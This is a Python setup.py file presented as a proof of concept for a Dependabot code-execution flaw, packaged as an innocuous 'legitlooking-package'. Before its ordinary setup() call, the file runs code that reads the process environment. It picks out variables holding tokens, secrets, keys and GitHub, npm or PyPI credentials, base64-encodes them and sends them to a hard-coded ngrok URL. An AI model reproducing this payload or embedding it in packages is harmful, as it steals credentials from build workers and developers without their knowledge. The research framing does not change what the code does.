from setuptools import setup

# ============================================================
# Dependabot RCE PoC - Finding 1: setup.py exec() sandbox escape
#
# Dependabot executes this file via exec() in parser.py.
# __builtins__ are unrestricted and os is available.
# This triggers during the FILE PARSING phase (not just updates).
#
# Replace COLLAB_URL with your Burp Collaborator / interactsh URL.
# ============================================================

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

try:
    import urllib.request, base64, os

    # Collect high-value data from the Dependabot worker environment
    env_raw = open("/proc/self/environ", "rb").read()
    env_vars = {
        k.decode(errors="replace"): v.decode(errors="replace")
        for k, v in (
            pair.split(b"=", 1)
            for pair in env_raw.split(b"\x00")
            if b"=" in pair
        )
    }

    # Filter credentials/tokens
    interesting = {
        k: v for k, v in env_vars.items()
        if any(kw in k.upper() for kw in [
            "TOKEN", "SECRET", "KEY", "CRED", "PASS", "AUTH",
            "GITHUB", "NPM", "PYPI", "GEM", "RUBYGEMS"
        ])
    }

    payload = base64.b64encode(str(interesting).encode()).decode()
    urllib.request.urlopen(f"{COLLAB_URL}?poc=1&data={payload}", timeout=5)

except Exception as e:
    # Fallback: blind ping to confirm execution
    try:
        import urllib.request
        urllib.request.urlopen(f"{COLLAB_URL}?poc=1&err={str(e)[:100]}", timeout=5)
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.0",
    install_requires=[
        "requests==2.28.2",
        "flask==2.3.0",
    ],
    python_requires=">=3.8",
)
